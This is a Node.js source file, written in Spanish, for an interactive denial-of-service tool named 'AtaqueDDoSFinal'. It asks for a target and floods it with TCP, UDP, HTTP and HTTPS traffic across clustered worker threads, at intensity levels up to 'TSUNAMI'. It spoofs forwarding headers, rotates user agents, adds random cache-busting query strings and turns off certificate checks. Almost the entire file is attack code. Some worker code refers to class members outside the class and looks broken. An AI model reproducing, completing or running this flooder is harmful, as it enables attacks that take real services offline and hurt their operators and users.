#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const dns = require('dns/promises');
const url = require('url');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const os = require('os');

const colores = {
    titulo: "\x1b[1;33m", 
    pregunta: "\x1b[1;32m",
    error: "\x1b[1;31m",
    exito: "\x1b[1;92m",
    advertencia: "\x1b[1;93m",
    info: "\x1b[1;96m",
    estadistica: "\x1b[1;97m",
    destacado: "\x1b[1;95m",
    debug: "\x1b[90m",
    reset: "\x1b[0m"
};

class AtaqueDDoSFinal {
    constructor() {
        this.estadisticas = {
            total: 0,
            exitosas: 0,
            fallidas: 0,
            anchoBanda: 0,
            metodos: { TCP: 0, UDP: 0, HTTP: 0, HTTPS: 0 }
        };
        this.trabajadores = [];
        this.metodos = ['TCP', 'UDP', 'HTTP', 'HTTPS'];
        this.inicioTiempo = Date.now();
        this.intervaloEstadisticas = null;
        this.payloads = this.generarPayloads();
    }

    generarPayloads() {
        return {
            TCP: crypto.randomBytes(4096),
            UDP: crypto.randomBytes(65507),
            HTTP: this.generarPeticionHTTP(),
            HTTPS: this.generarPeticionHTTP(true)
        };
    }

    generarPeticionHTTP(seguro = false) {
        const metodos = seguro ? ['GET', 'POST'] : ['GET', 'POST', 'HEAD'];
        const rutas = ['/', '/wp-login.php', '/api/v1/usuarios', '/graphql', '/admin'];
        const agentesUsuario = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
            'curl/8.2.1'
        ];

        const metodoAleatorio = metodos[Math.floor(Math.random() * metodos.length)];
        const rutaAleatoria = rutas[Math.floor(Math.random() * rutas.length)];
        const agenteAleatorio = agentesUsuario[Math.floor(Math.random() * agentesUsuario.length)];
        const ipAleatoria = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

        return Buffer.from([
            `${metodoAleatorio} ${rutaAleatoria}?${crypto.randomBytes(16).toString('hex')} HTTP/1.1`,
            `Host: ${workerData?.objetivo || 'ejemplo.com'}`,
            `User-Agent: ${agenteAleatorio}`,
            'Accept: */*',
            'Accept-Language: es-ES,es;q=0.9',
            'Connection: keep-alive',
            'Cache-Control: no-cache',
            `X-Forwarded-For: ${ipAleatoria}`,
            `X-Real-IP: ${ipAleatoria}`,
            'Content-Length: 0',
            '\r\n'
        ].join('\r\n'));
    }

    async iniciar() {       
        const objetivo = await this.preguntar(`${colores.pregunta}Objetivo (URL/IP): ${colores.reset}`);
        const { host, puerto, protocolo } = await this.resolverObjetivo(objetivo);
        const hilos = await this.numeroEntre(`${colores.pregunta}Hilos (100-20000): ${colores.reset}`, 100, 20000);
        const duracion = await this.numeroEntre(`${colores.pregunta}Duración (segundos): ${colores.reset}`, 10, 86400);
        const intensidad = await this.seleccionarIntensidad();

        console.log(`${colores.info}\n🔹 Objetivo: ${host}:${puerto}${colores.reset}`);
        console.log(`${colores.info}🔹 Protocolo: ${protocolo.toUpperCase()}${colores.reset}`);
        console.log(`${colores.info}🔹 Hilos: ${hilos}${colores.reset}`);
        console.log(`${colores.info}🔹 Duración: ${duracion} segundos${colores.reset}`);
        console.log(`${colores.info}🔹 Intensidad: ${intensidad}${colores.reset}`);

        this.iniciarAtaque(host, puerto, hilos, intensidad);
        this.mostrarEstadisticas();
        setTimeout(() => this.detener(), duracion * 1000);
    }

    async seleccionarIntensidad() {
        console.log(`\n${colores.info}Intensidad del ataque:${colores.reset}`);
        console.log(`${colores.advertencia}1. Constante (baja)${colores.reset}`);
        console.log(`${colores.advertencia}2. Agresiva (media)${colores.reset}`);
        console.log(`${colores.advertencia}3. Inundación (alta)${colores.reset}`);
        console.log(`${colores.advertencia}4. TSUNAMI (máxima)${colores.reset}\n`);

        const opcion = await this.numeroEntre(`${colores.pregunta}Opción (1-4): ${colores.reset}`, 1, 4);
        return ['Constante', 'Agresiva', 'Inundación', 'TSUNAMI'][opcion - 1];
    }

    iniciarAtaque(objetivo, puerto, hilos, intensidad) {
        if (cluster.isMaster) {
            const nucleos = Math.min(os.cpus().length, 32);
            for (let i = 0; i < nucleos; i++) {
                cluster.fork();
            }

            cluster.on('exit', (worker) => {
                cluster.fork();
            });
        } else {
            const hilosTrabajo = Math.ceil(hilos / os.cpus().length);

            for (let i = 0; i < hilosTrabajo; i++) {
                const metodo = this.metodos[Math.floor(Math.random() * this.metodos.length)];
                const worker = new Worker(__filename, { 
                    workerData: { 
                        objetivo, 
                        puerto, 
                        metodo,
                        intensidad
                    }
                });
                
                worker.on('message', (msg) => {
                    this.estadisticas.total += msg.total || 0;
                    this.estadisticas.exitosas += msg.exitosas || 0;
                    this.estadisticas.fallidas += msg.fallidas || 0;
                    this.estadisticas.anchoBanda += msg.anchoBanda || 0;
                    if (msg.metodo) this.estadisticas.metodos[msg.metodo]++;
                });
                
                this.trabajadores.push(worker);
            }
        }
    }

    calcularRetraso(intensidad) {
        const retrasos = {
            'Constante': 100,
            'Agresiva': 20,
            'Inundación': 3,
            'TSUNAMI': 0
        };
        return retrasos[intensidad] || 20;
    }

    mostrarEstadisticas() {
        const mostrar = () => {
            const transcurrido = (Date.now() - this.inicioTiempo) / 1000;
            const pps = transcurrido > 0 ? (this.estadisticas.total / transcurrido).toFixed(0) : 0;
            const ab = (this.estadisticas.anchoBanda / (1024 ** 2)).toFixed(2);
            const tasaExito = this.estadisticas.total > 0 
                ? ((this.estadisticas.exitosas / this.estadisticas.total) * 100).toFixed(1) 
                : '0.0';

            readline.clearLine(process.stdout, 0);
            readline.cursorTo(process.stdout, 0);

            const display = [
                `${colores.destacado}⏱️ ${transcurrido.toFixed(1)}s${colores.reset}`,
                `${colores.estadistica}REQ:${colores.info} ${this.estadisticas.total}${colores.reset}`,
                `${colores.estadistica}ÉXITO:${colores.exito} ${this.estadisticas.exitosas}${colores.reset}`,
                `${colores.estadistica}FALLOS:${colores.error} ${this.estadisticas.fallidas}${colores.reset}`,
                `${colores.estadistica}TASA:${colores.advertencia} ${tasaExito}%${colores.reset}`,
                `${colores.estadistica}PPS:${colores.destacado} ${pps}${colores.reset}`,
                `${colores.estadistica}ANCHO:${colores.info} ${ab}MB/s${colores.reset}`
            ].join(' | ');

            process.stdout.write(display);
        };

        this.intervaloEstadisticas = setInterval(mostrar, 500);
        mostrar();
    }

    async preguntar(pregunta) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolver => {
            rl.question(pregunta, respuesta => {
                rl.close();
                resolver(respuesta.trim());
            });
        });
    }

    async numeroEntre(pregunta, min, max) {
        let num;
        do num = parseInt(await this.preguntar(pregunta)) || min;
        while (num < min || num > max);
        return num;
    }

    async resolverObjetivo(entrada) {
        try {
            const parseado = new url.URL(entrada.includes('://') ? entrada : `http://${entrada}`);
            const resuelto = await dns.lookup(parseado.hostname);
            return { 
                host: resuelto.address, 
                puerto: parseado.port || (parseado.protocol === 'https:' ? 443 : 80),
                protocolo: parseado.protocol.replace(':', '')
            };
        } catch {
            console.log(`${colores.error}\n¡Objetivo inválido!${colores.reset}`);
            process.exit(1);
        }
    }

    detener() {
        clearInterval(this.intervaloEstadisticas);
        if (cluster.isMaster) {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
        }
        this.trabajadores.forEach(w => w.terminate());
        console.log(`${colores.exito}\nAtaque detenido${colores.reset}`);
        process.exit();
    }
}

if (!isMainThread) {
    const { objetivo, puerto, metodo, intensidad } = workerData;
    const retraso = this.calcularRetraso(intensidad);

    const metodosAtaque = {
        TCP: () => {
            const socket = net.connect(puerto, objetivo, () => {
                for (let i = 0; i < 10; i++) socket.write(this.payloads.TCP);
                socket.destroy();
                parentPort.postMessage({ 
                    total: 10, 
                    exitosas: 1, 
                    fallidas: 0, 
                    anchoBanda: this.payloads.TCP.length * 10,
                    metodo: 'TCP'
                });
            });
            
            socket.on('error', () => {
                parentPort.postMessage({ 
                    total: 10, 
                    exitosas: 0, 
                    fallidas: 10, 
                    anchoBanda: 0,
                    metodo: 'TCP'
                });
            });
        },
        UDP: () => {
            const socket = dgram.createSocket('udp4');
            for (let i = 0; i < 20; i++) {
                socket.send(this.payloads.UDP, puerto, objetivo, () => {
                    parentPort.postMessage({ 
                        total: 1, 
                        exitosas: 1, 
                        fallidas: 0, 
                        anchoBanda: this.payloads.UDP.length,
                        metodo: 'UDP'
                    });
                });
            }
            setTimeout(() => socket.close(), 50);
        },
        HTTP: () => {
            const req = http.request({
                host: objetivo,
                port: puerto,
                method: ['GET', 'POST'][Math.floor(Math.random() * 2)],
                path: `/?${crypto.randomBytes(16).toString('hex')}`,
                headers: {
                    'User-Agent': this.payloads.HTTP.toString().split('\r\n')[2].split(': ')[1],
                    'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
            });
            
            req.on('response', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    exitosas: 1, 
                    fallidas: 0, 
                    anchoBanda: this.payloads.HTTP.length,
                    metodo: 'HTTP'
                });
            });
            
            req.on('error', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    exitosas: 0, 
                    fallidas: 1, 
                    anchoBanda: 0,
                    metodo: 'HTTP'
                });
            });
            
            req.end();
        },
        HTTPS: () => {
            const req = https.request({
                host: objetivo,
                port: puerto,
                method: 'GET',
                path: `/?${crypto.randomBytes(16).toString('hex')}`,
                rejectUnauthorized: false,
                headers: {
                    'User-Agent': this.payloads.HTTPS.toString().split('\r\n')[2].split(': ')[1],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache'
                }
            });
            
            req.on('response', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    exitosas: 1, 
                    fallidas: 0, 
                    anchoBanda: this.payloads.HTTPS.length,
                    metodo: 'HTTPS'
                });
            });
            
            req.on('error', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    exitosas: 0, 
                    fallidas: 1, 
                    anchoBanda: 0,
                    metodo: 'HTTPS'
                });
            });
            
            req.end();
        }
    };

    const atacar = () => metodosAtaque[metodo]();
    
    if (intensidad === 'TSUNAMI') {
        const oleadaAtaque = () => {
            for (let i = 0; i < 10; i++) atacar();
        };
        setInterval(oleadaAtaque, 1);
    } else {
        setInterval(atacar, retraso);
    }
}

if (isMainThread && !cluster.isWorker) {
    new AtaqueDDoSFinal().iniciar();
}